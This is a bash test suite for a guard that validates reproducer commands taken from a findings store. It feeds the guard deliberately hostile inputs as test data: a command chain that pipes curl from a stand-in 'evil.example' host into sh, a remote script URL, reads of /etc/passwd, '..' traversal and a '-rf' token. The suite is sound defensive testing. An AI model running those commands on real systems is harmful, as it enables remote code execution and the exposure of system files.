#!/usr/bin/env bash
# Assertion harness for check-panel-reproducers.sh.
#
# THE GUARD NOW READS THE STORE, NOT RENDERED MARKDOWN. Every case below
# builds a worktree-shaped sandbox and a stub `myflow` binary placed ahead of
# the real one on PATH inside that sandbox: the stub answers
# `record findings -change <name> [-C <dir>]` with a canned JSON array (the
# shape `myflow record findings` itself prints -- one object per finding with
# at least `ref`, `status`, `reproducer`), or exits non-zero to simulate a
# store the guard could not reach. No case writes a
# docs/superpowers/reviews/*-panel.md file any more; that path, and the
# marker-line grammar the guard used to parse out of it, are retired by this
# rewrite.
#
# This task (task 5 of KAN-271) does NOT touch check-panel-reproducers.sh
# itself -- that is task 6. The guard today still resolves a rendered
# Markdown record via panel_record_path and finds none of these fixtures,
# so this suite is EXPECTED TO FAIL until task 6 lands.
#
# Dropped, relative to the guard's previous ~39 cases plus its metacharacter
# loop -- each is a Markdown-parsing failure mode with no JSON equivalent, or
# a scenario the new architecture no longer produces at all:
#
#   - "MISSING"/"EXTRA" (old cases 2, 10) and the reversed-block-order case
#     (old case 19) -- table/marker-agreement checks comparing the
#     finding-status block's identifiers against the finding-reproducer
#     block's. A decoded finding is a single JSON object carrying both its
#     status and its reproducer together; there is no second block whose set
#     of identifiers could disagree with the first.
#   - reproducers-total mismatch, absence, duplication, an absurdly long
#     digit string, and a malformed total beside a well-formed one (old
#     cases 3, 12, 13, 17, 20, 33) -- checksum-mismatch checks against a
#     declared count. The JSON array's own length is the count now
#     (`jq 'length'`), so there is nothing separate left to disagree with it.
#   - the reused-identifier case (old case 4) -- `findings_ref_key` is a
#     store uniqueness constraint (see design.md's `store-side-findings`
#     decision), so two rows sharing a ref cannot reach this guard; the
#     duplicate-detection code itself is deleted in task 6, not merely
#     untested here.
#   - the indented marker line, the identifier with nothing after it, and
#     the indented duplicate that isolates the same check (old cases 5, 5b,
#     11) -- Markdown marker-grammar defects. A decoded JSON object has no
#     "indentation" and no "identifier with nothing after it"; its
#     reproducer field is simply present, absent, or empty.
#   - the missing-record-file case (old case 8) -- `record findings` against
#     a change the store has never heard of now prints `[]` and exits 0
#     (task 4's ErrNotFound branch), which is exactly case 3 below (zero
#     findings). The only "cannot answer at all" shape left is the new
#     store-unreachable case this rewrite adds.
#   - the directory-shaped record path (old case 14) and the three
#     panel_record_path/directory-scan cases -- a record only at the old sdd
#     path, that path raising no violation of its own, and the anchored
#     match rejecting another change's dated record (old cases 39a, 39b,
#     39c) -- all exercise panel_record_path's glob-matching over
#     docs/superpowers/reviews, which task 6 deletes outright along with the
#     function itself.
#   - the dash-prefixed relative worktree defeating a grep-as-options
#     injection into the record path (old case 16) -- that hazard was grep
#     parsing a path built from WORKTREE as options; once the record comes
#     from `myflow record findings -C "$WORKTREE"`, no grep ever runs
#     against a path built from WORKTREE, so the premise is gone.
#   - the prose-between-markers case (old case 18) -- marker-span; a decoded
#     JSON array has no notion of two blocks that could be interrupted.
#   - the NUL-byte case (old case 31) -- a `jq` decode failure has one
#     shape, not the six the hand-rolled parser had to distinguish.
#   - the missing-lib/panel-record.sh case (old case 38) -- task 6 deletes
#     the guard's `source .../lib/panel-record.sh` line and its readability
#     check outright, so there is no guard code left to exercise this
#     scenario against once task 6 lands.
#
# `-e` as well as `-u`/`pipefail`, matching sixteen of this repository's
# eighteen sibling harnesses. Without `-e`, a failed `mktemp` in
# make_worktree_json left `$wt` holding the PREVIOUS case's path -- the
# harness kept going, ran that case's assertion against a stale sandbox from
# a different case, and could still print every case passing. `set +e`/
# `set -e` bracket the two helpers below, exactly like the sibling harnesses'
# own pattern, because their whole job is to capture a command that is
# SUPPOSED to exit non-zero, and `-e` would otherwise abort the suite on the
# very first such case.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GUARD="$SCRIPT_DIR/check-panel-reproducers.sh"
FAILED=0

# Every case leaves one sandbox directory behind, removed on exit including
# on a failed assertion. An indexed array, not a space-separated string:
# mktemp paths under TMPDIR may contain spaces, and word-splitting a string
# would leak a sandbox whose path split and rm -rf the fragments.
WORKTREES=()
cleanup() {
  [ "${#WORKTREES[@]}" -eq 0 ] && return 0
  for wt in "${WORKTREES[@]}"; do
    rm -rf "$wt"
  done
}
trap cleanup EXIT

# findings_json <ref> <status> <reproducer> [<ref> <status> <reproducer> ...]
# -- builds a compact JSON array of finding objects from ref/status/reproducer
# triples, via `jq -n --args` rather than hand-quoted string interpolation,
# so that a reproducer value carrying a quote or a backslash (the
# metacharacter loop below needs both) is escaped correctly without this
# harness reimplementing JSON string escaping itself.
findings_json() {
  # `--` before the positional arguments, not just `--args` before them: a
  # reproducer value starting with `-` (case 8's `-rf`) is otherwise parsed
  # by jq's own option handling rather than treated as a positional string.
  jq -nc '
    [$ARGS.positional as $a
     | range(0; ($a | length) / 3)
     | {ref: $a[. * 3], status: $a[. * 3 + 1], reproducer: $a[. * 3 + 2]}]
  ' --args -- "$@"
}

# make_worktree_json <json-array> -- a worktree-shaped sandbox carrying a
# stub `myflow` on its own bin/, which prints <json-array> for
# `record findings` and exits 0 regardless of the flags it was called with.
# Prints the worktree path.
make_worktree_json() {
  local wt json="$1"
  wt="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")" || {
    printf 'make_worktree_json: mktemp failed -- aborting suite rather than continuing with a stale path\n' >&2
    exit 1
  }
  WORKTREES+=("$wt")
  mkdir -p "$wt/bin"
  # The JSON payload is written to its own file rather than interpolated
  # into the heredoc's shell source: a reproducer value under test may
  # itself carry a literal single quote (case 17's apostrophe metachar), and
  # embedding that byte inside a `'$json'`-quoted printf argument would
  # prematurely close the quote and hand the shell a syntactically invalid
  # script -- a defect in the stub generator, not in anything under test.
  printf '%s' "$json" > "$wt/bin/findings.json"
  cat > "$wt/bin/myflow" <<'STUB'
#!/usr/bin/env bash
cat "$(dirname -- "$0")/findings.json"
exit 0
STUB
  chmod +x "$wt/bin/myflow"
  printf '%s' "$wt"
}

# make_worktree_store_unreachable -- a worktree-shaped sandbox whose stub
# `myflow` exits non-zero and prints nothing useful to stdout, simulating a
# store `record findings` could not reach.
make_worktree_store_unreachable() {
  local wt
  wt="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")" || {
    printf 'make_worktree_store_unreachable: mktemp failed -- aborting suite rather than continuing with a stale path\n' >&2
    exit 1
  }
  WORKTREES+=("$wt")
  mkdir -p "$wt/bin"
  cat > "$wt/bin/myflow" <<'STUB'
#!/usr/bin/env bash
echo "myflow: connect: connection refused" >&2
exit 1
STUB
  chmod +x "$wt/bin/myflow"
  printf '%s' "$wt"
}

# run_with_stub <guard-binary> <worktree> <name> -- runs <guard-binary>
# against <worktree>/<name>, with <worktree>/bin (the stub myflow's home)
# placed ahead of the real PATH. The env-prefix form scopes PATH to this one
# command's execution environment alone, never leaking into the harness's
# own shell.
run_with_stub() {
  local guard="$1" wt="$2" name="$3"
  PATH="$wt/bin:$PATH" "$guard" "$wt" "$name"
}

run_guard() {
  run_with_stub "$GUARD" "$1" "${2:-demo}"
}

expect_exit() {
  # $1 = label, $2 = expected exit, $3... = command
  local label="$1" want="$2"; shift 2
  local out got
  # The command under test is EXPECTED to exit non-zero in most cases here,
  # so it runs under a local `set +e`/`set -e` bracket -- matching this
  # repository's other harnesses -- rather than letting the suite's own
  # `set -e` treat that expected non-zero exit as the suite's own failure.
  set +e
  out="$("$@" 2>&1)"; got=$?
  set -e
  if [[ "$got" != "$want" ]]; then
    printf 'FAIL %s: expected exit %s, got %s\n%s\n' "$label" "$want" "$got" "$out"
    FAILED=1
  else
    printf 'ok: %s\n' "$label"
  fi
}

expect_exit_and_names() {
  # $1 = label, $2 = expected exit, $3 = substring the output must contain,
  # $4... = command
  local label="$1" want="$2" needle="$3"; shift 3
  local out got
  set +e
  out="$("$@" 2>&1)"; got=$?
  set -e
  if [[ "$got" != "$want" ]]; then
    printf 'FAIL %s: expected exit %s, got %s\n%s\n' "$label" "$want" "$got" "$out"
    FAILED=1
    return
  fi
  case "$out" in
    *"$needle"*) printf 'ok: %s\n' "$label" ;;
    *)
      printf 'FAIL %s: expected output to name %s, got:\n%s\n' "$label" "$needle" "$out"
      FAILED=1
      ;;
  esac
}

# ===========================================================================
# 1. Every finding has a well-formed reproducer -- exit 0.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json \
  F1 fixed 'scripts/test-check-panel-reproducers.sh' \
  F2 fixed 'none — prose-only, no runnable check')")"
expect_exit 'case 1: all present exits 0' 0 run_guard "$wt"

# ===========================================================================
# 2. none — <reason> is accepted as well-formed -- exit 0.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json \
  F1 fixed 'none — prose-only, no runnable check')")"
expect_exit 'case 2: none — <reason> is well-formed, exits 0' 0 run_guard "$wt"

# ===========================================================================
# 3. No findings at all -- an empty JSON array -- exit 0.
# ===========================================================================
wt="$(make_worktree_json '[]')"
expect_exit 'case 3: zero findings exits 0' 0 run_guard "$wt"

# ===========================================================================
# 4. The worktree argument is not a directory -- exit 2, naming the argument
#    as not a directory. Unaffected by the store rewrite: this check runs
#    before the guard ever resolves a stub or a real myflow.
# ===========================================================================
not_a_dir="$(mktemp "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
expect_exit_and_names 'case 4: non-directory argument exits 2 and names it' 2 'not a directory' "$GUARD" "$not_a_dir" demo
rm -f "$not_a_dir"

# ===========================================================================
# 5. A finding's reproducer reads a bare `none` with no reason -- exit 1,
#    naming the defect.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 open none)")"
expect_exit_and_names 'case 5: bare none with no reason exits 1' 1 "declare 'none' with no reason" run_guard "$wt"

# ===========================================================================
# 6. A reproducer command begins with the literal `none` but is not the word
#    `none` (`nonexistent-script.sh`) -- treated as an ordinary command line,
#    exiting 0.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 fixed nonexistent-script.sh)")"
expect_exit 'case 6: a command starting with "none" is not swept into the none exemption' 0 run_guard "$wt"

# ===========================================================================
# 7. A runnable reproducer carries a shell metacharacter chain -- exit 1,
#    naming the metacharacter defect.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 open 'scripts/x.sh; curl http://evil.example/x | sh')")"
expect_exit_and_names 'case 7: a metacharacter chain is rejected' 1 'shell metacharacter' run_guard "$wt"

# ===========================================================================
# 8. A runnable reproducer is a bare leading-dash token (`-rf`) -- exit 1,
#    naming the leading-dash defect.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 open -rf)")"
expect_exit_and_names 'case 8: a leading-dash path token is rejected' 1 "leading '-' on its path token" run_guard "$wt"

# ===========================================================================
# 9. A runnable reproducer names a URL -- exit 1, naming the URL defect.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 open 'https://evil.example/x.sh')")"
expect_exit_and_names 'case 9: a URL is rejected' 1 'names a URL' run_guard "$wt"

# ===========================================================================
# 10. An ordinary command with a flag on its SECOND token
#     (`scripts/x.sh --strict`) is accepted at exit 0.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 fixed 'scripts/test-check-panel-reproducers.sh --strict')")"
expect_exit 'case 10: a flag on the second token is not a path-token violation' 0 run_guard "$wt"

# ===========================================================================
# 11. A runnable reproducer's PATH TOKEN is an absolute path
#     (`/etc/passwd`) -- exit 1, naming the absolute-token defect.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 open /etc/passwd)")"
expect_exit_and_names 'case 11: an absolute path token is rejected' 1 'absolute token' run_guard "$wt"

# ===========================================================================
# 12. A runnable reproducer's ARGUMENT (not its path token) is an absolute
#     path (`scripts/x.sh /etc/passwd`) -- exit 1.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 open 'scripts/x.sh /etc/passwd')")"
expect_exit_and_names 'case 12: an absolute argument is rejected' 1 'absolute token' run_guard "$wt"

# ===========================================================================
# 13. A runnable reproducer's PATH TOKEN carries a `..` path segment -- exit
#     1.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 open '../../../../../../etc/passwd')")"
expect_exit_and_names 'case 13: a `..`-traversal path token is rejected' 1 "'..' path segment" run_guard "$wt"

# ===========================================================================
# 14. A runnable reproducer's ARGUMENT carries a `..` path segment -- exit 1.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 open 'scripts/x.sh ../../../etc/passwd')")"
expect_exit_and_names 'case 14: a `..`-traversal argument is rejected' 1 "'..' path segment" run_guard "$wt"

# ===========================================================================
# 15. A positive control for cases 13-14: a path token containing the two
#     characters `..` WITHOUT that being a whole path segment
#     (`scripts/foo..bar.sh`) is accepted at exit 0.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 fixed 'scripts/foo..bar.sh')")"
expect_exit 'case 15: two dots inside a filename, not a path segment, is not rejected' 0 run_guard "$wt"

# ===========================================================================
# 16. A runnable reproducer ends in a trailing backslash (`scripts/x.sh\`) --
#     exit 1, naming the shell-metacharacter defect: a trailing backslash is
#     a shell line-continuation, which would put a following line outside
#     every check here if it were not banned.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 open 'scripts/x.sh\')")"
expect_exit_and_names 'case 16: a trailing backslash is rejected' 1 'shell metacharacter' run_guard "$wt"

# ===========================================================================
# 17. Every banned shell metacharacter, INDIVIDUALLY, triggers rejection -- a
#     loop rather than one near-identical case per character, so that adding
#     or removing a character from the banned set only requires touching the
#     shared list here and in the guard. Case 18 below is the positive
#     control this loop needs: without it, a guard broken to reject every
#     reproducer regardless of content would make this loop pass just as
#     vacuously.
# ===========================================================================
banned_metachars='|;&$`<>(){}~*?[]#\'\''"'
mc_i=0
while [ "$mc_i" -lt "${#banned_metachars}" ]; do
  mc_c="${banned_metachars:$mc_i:1}"
  wt="$(make_worktree_json "$(findings_json F1 open "scripts/x${mc_c}sh")")"
  expect_exit_and_names "case 17.$mc_i: banned metacharacter '$mc_c' alone is rejected" 1 'shell metacharacter' run_guard "$wt"
  mc_i=$((mc_i + 1))
done

# ===========================================================================
# 18. Positive control for case 17's loop: an ordinary command carrying NONE
#     of the banned metacharacters is accepted at exit 0.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 fixed 'scripts/test-check-panel-reproducers.sh')")"
expect_exit "case 18: an ordinary command with no banned metacharacter is accepted" 0 run_guard "$wt"

# ===========================================================================
# 19. check-panel-reproducers.sh and run-reproducer.sh agree on the
#     banned-character set, per finding F48 -- this exact literal drifted
#     between the two scripts twice already (the backslash for F33, both
#     quote characters for F45, each time landing in one file before the
#     other). Asserted two ways: both scripts read the set from
#     scripts/reproducer-metachars.sh rather than each carrying its own
#     literal (so neither can drift on its own again), and that shared
#     file's value is exactly the expected set (so the shared copy itself
#     has not silently lost or gained a character). Untouched by the store
#     rewrite: this checks the two scripts' own source, not a panel record.
# ===========================================================================
METACHARS_FILE="$SCRIPT_DIR/reproducer-metachars.sh"
EXPECTED_METACHARS='|;&$`<>(){}~*?[]#\'\''"'
if [ -f "$METACHARS_FILE" ] \
  && grep -qF 'source "$SCRIPT_DIR/reproducer-metachars.sh"' "$GUARD" \
  && grep -qF 'source "$SCRIPT_DIR/reproducer-metachars.sh"' "$SCRIPT_DIR/run-reproducer.sh" \
  && ! grep -qE "^\s*metachars='" "$GUARD" \
  && ! grep -qE "^\s*metachars='" "$SCRIPT_DIR/run-reproducer.sh"; then
  # shellcheck disable=SC1090
  ACTUAL_METACHARS="$(bash -c 'source "'"$METACHARS_FILE"'" && printf %s "$REPRODUCER_METACHARS"')"
  if [ "$ACTUAL_METACHARS" = "$EXPECTED_METACHARS" ]; then
    printf 'ok: %s\n' 'case 19: check-panel-reproducers.sh and run-reproducer.sh agree on the banned-character set'
  else
    printf 'FAIL %s: scripts/reproducer-metachars.sh carries an unexpected set: %s\n' 'case 19' "$ACTUAL_METACHARS"
    FAILED=1
  fi
else
  printf 'FAIL %s: check-panel-reproducers.sh and run-reproducer.sh no longer both source the single shared metachar file\n' 'case 19'
  FAILED=1
fi

# ===========================================================================
# 20. A missing scripts/reproducer-metachars.sh is reported as "cannot
#     answer" (exit 2), not "violations found" (exit 1) -- finding F56.
#     Exercised against a REAL copy of the guard, sitting in its own sandbox
#     directory with a well-formed stub myflow beside it but deliberately no
#     reproducer-metachars.sh, rather than editing the real scripts/
#     directory this suite runs from. This check runs before the guard ever
#     calls myflow, so it is unaffected by the store rewrite.
# ===========================================================================
wt="$(make_worktree_json "$(findings_json F1 fixed 'scripts/test-check-panel-reproducers.sh')")"
MISSING_DEP_DIR="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test-missing-dep.XXXXXX")"
WORKTREES+=("$MISSING_DEP_DIR")
cp "$GUARD" "$MISSING_DEP_DIR/check-panel-reproducers.sh"
expect_exit_and_names 'case 20: a missing reproducer-metachars.sh is cannot-answer, not violations-found' 2 'cannot read' \
  run_with_stub "$MISSING_DEP_DIR/check-panel-reproducers.sh" "$wt" demo

# ===========================================================================
# 21. THE CHANGE NAME IS PR-CONTROLLED -- it reaches this guard from a state
#     file anyone able to open a pull request can edit -- and is matched
#     against the entries of a directory even after the store rewrite (task
#     6 keeps this containment `case` block; only panel_record_path itself
#     is deleted). These are the same shapes test-check-unfinished-work.sh
#     rejects, asserted here so that the two copies of the allowlist cannot
#     drift apart in silence, and one case for the name being absent
#     altogether.
# ===========================================================================
wt21="$(make_worktree_json "$(findings_json F1 fixed 'scripts/test-check-panel-reproducers.sh')")"
for bad_name in "../../../planted/clear" "demo*" "demo/../demo" ".hidden" "demo?x"; do
  expect_exit_and_names "case 21: change name '$bad_name' is rejected" 2 'is not a plain change name' run_with_stub "$GUARD" "$wt21" "$bad_name"
done
expect_exit_and_names 'case 21: a missing change name is rejected' 2 'usage:' run_with_stub "$GUARD" "$wt21" ""

# ===========================================================================
# 22. THE STORE IS UNREACHABLE -- stub myflow exits non-zero for
#     `record findings`, and the guard must exit 2 ("cannot determine
#     anything"), never 1 (there is no record to have found a violation in)
#     and never 0 (a read it could not perform must never be reported as a
#     clean answer). NEW in this rewrite: the previous guard's closest
#     analogue -- no panel record file at the expected path -- is retired
#     (see the header comment's "missing-record-file case" note), since a
#     change the store has genuinely never heard of now answers `[]` at exit
#     0, not a failure; the ONLY "cannot answer at all" shape left is the
#     store call itself failing, which is what this case exercises.
#
#     THIS CASE FAILS UNTIL TASK 6 LANDS, on purpose: today's guard still
#     resolves a rendered Markdown file, finds none (this sandbox writes no
#     docs/superpowers/reviews/*-panel.md), and reports "no readable panel
#     record for ..." at exit 2 -- the right exit code by coincidence, but
#     not the "cannot determine anything" wording this case asserts, so it
#     correctly fails now and will only pass once task 6's guard actually
#     calls myflow and surfaces its failure that way.
# ===========================================================================
wt="$(make_worktree_store_unreachable)"
expect_exit_and_names 'case 22: an unreachable store is cannot-answer, never violations-found or clean' 2 'cannot determine anything' run_guard "$wt"

if [ "$FAILED" -ne 0 ]; then
  printf 'check-panel-reproducers-test: one or more cases failed\n' >&2
  exit 1
fi
printf 'check-panel-reproducers-test: all 22 cases plus the metacharacter loop pass\n'
